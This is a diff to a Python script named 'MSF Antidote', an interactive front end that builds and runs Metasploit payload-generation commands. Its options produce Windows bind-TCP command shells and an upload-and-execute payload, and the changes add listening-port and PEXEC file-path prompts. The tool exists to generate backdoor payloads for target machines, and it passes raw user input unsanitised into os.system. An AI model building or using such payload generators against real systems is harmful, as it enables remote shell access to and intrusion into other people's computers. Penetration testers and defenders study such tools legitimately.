@@ -13,7 +13,7 @@ green = '\u001b[32m'
 yellow = '\u001b[33m'
 blue = '\u001b[34m'
 magenta = '\u001b[35m'
-Cyan = '\u001b[36m'
+cyan = '\u001b[36m'
 white = '\u001b[37m'
 normal = '\u001b[00m'
 
@@ -37,14 +37,17 @@ def main():
     stage = ''
     LHOST = ''
     LPORT = ''
-    form= ''
+    RHOST = ''
+    RPORT = ''
+    form = ''
     payload = ''
     output = ''
     plat_cmd = ''
     arch_cmd = ''
+    pexec_cmd = ''
 
     #OS Detection
-    detect_input = input('\nWelcome to MSF Antidote.  Would you like to enable OS detection? [Requires Nmap] (y/n)  ')
+    detect_input = input(f'{black}\nWelcome to MSF Antidote.  Would you like to enable OS detection? {red}[Requires Nmap] {cyan}(y/n){normal}  ')
 
     if detect_input.lower() == 'y':
         ip_input = input('\nPlease enter the target IP: ')
@@ -55,7 +58,7 @@ def main():
 
     #Platform Selection
     elif detect_input.lower() == 'n':
-        platform_input = input('\nSelect your target platform:\n\n1) Windows\n\n2) Linux\n\n3) OSX\n\n4) Apple ios\n\n5) Android\n\n')
+        platform_input = input(f'\n{black}Select your target platform:\n\n{white}1) {cyan}Windows\n\n{white}2) {cyan}Linux\n\n{white}3) {cyan}OSX\n\n{white}4) {cyan}Apple ios\n\n{white}5) {cyan}Android\n\n{normal}')
         os.system('clear')
 
 
@@ -67,21 +70,34 @@ def main():
             form = '-f exe'            
             
         #Windows Architecture Input
-            architecture_input = input('\nSelect Platform Architecture:\n\n1) x86\n\n2) x64')
+            architecture_input = input(f'\n{black}Select Platform Architecture:\n\n{white}1) {cyan}x86\n\n{white}2) {cyan}x64{normal}')
             os.system('clear')
             if architecture_input == '1':
                 arch_cmd = '-a x86'
 
         #Windows x86 Payload Input
-                payload_input = input('Select from available payloads:\n\n1) Spawn a piped command shell\n\n2) Upload an executable and run it\n\n3) Inject a VNC Dll via a reflective loader\n\n')
+                payload_input = input(f'{black}Select from available payloads:\n\n{white}1) {cyan}Spawn a piped command shell\n\n{white}2) {cyan}Upload an executable and run it\n\n{normal}')
                 os.system('clear')
 
                 if payload_input == '1':
                     payload = 'shell/bind_tcp'
+                    
+                    port_input = input(f'\n{black}Enter Listening Port: \n\n{normal}')
+                    LPORT = f'LPORT={port_input}'   
+                    
+                    os.system('clear')
+
                 elif payload_input == '2':
                     payload = 'upexec/bind_tcp'
-                elif payload_input == '3':
-                    payload = 'vncinject/bind_tcp'
+                    
+                    port_input = input(f'\n{black}Enter Listening Port: \n\n{normal}')
+                    LPORT = f'LPORT={port_input}'
+                    os.system('clear') 
+                    
+                    pexec_input = input(f'\n{black}Enter the path to the file you wish to upload and execute.\n\n{normal}')
+                    pexec_cmd = f'PEXEC={pexec_input}'
+                    os.system('clear')
+
 
         #Windows x64 Payload Input
             elif architecture_input == '2':
@@ -239,34 +255,34 @@ def main():
 
 
     #Port and IP Input
-    ip_input = input('\nEnter Target IP: \n\n')
-    LHOST = f'LHOST={ip_input}'
-    os.system('clear')
+    # ip_input = input('\nEnter Target IP: \n\n')
+    # LHOST = f'LHOST={ip_input}'
+    # os.system('clear')
 
-    port_input = input('\nEnter Target Port: \n\n')
-    LPORT = f'LPORT={port_input}'   
-    os.system('clear')
+    # port_input = input('\nEnter Target Port: \n\n')
+    # LPORT = f'LPORT={port_input}'   
+    # os.system('clear')
 
 
 
 
     #File Output
-    output = input('\nPlease Name Your File: ')
+    output = input(f'\n{black}Please Name Your File: {normal}')
     output = f'> {output}'
     os.system('clear')
 
     #Final Command       
-    cmd = f'{plat_str}{arch_str}{payload} {plat_cmd} {arch_cmd} {LHOST} {LPORT} {form} {output}'
+    cmd = f'{plat_str}{arch_str}{payload} {plat_cmd} {arch_cmd} {LHOST} {RHOST} {LPORT} {RPORT} {form} {pexec_cmd} {output}'
 
     os.system(cmd)
     print(cmd)
 
     #Repeat or exit
-    repeat = input('\n\nWould you like to create another payload?  (y/n): \n\n')
+    repeat = input(f'\n\n{black}Would you like to create another payload?  {cyan}(y/n): \n\n{normal}')
     if repeat.lower() == "y":
         main()
     else:
-        print('\nGood Bye')
+        print(f'\n{red}Good Bye{normal}')
         exit()
   
   
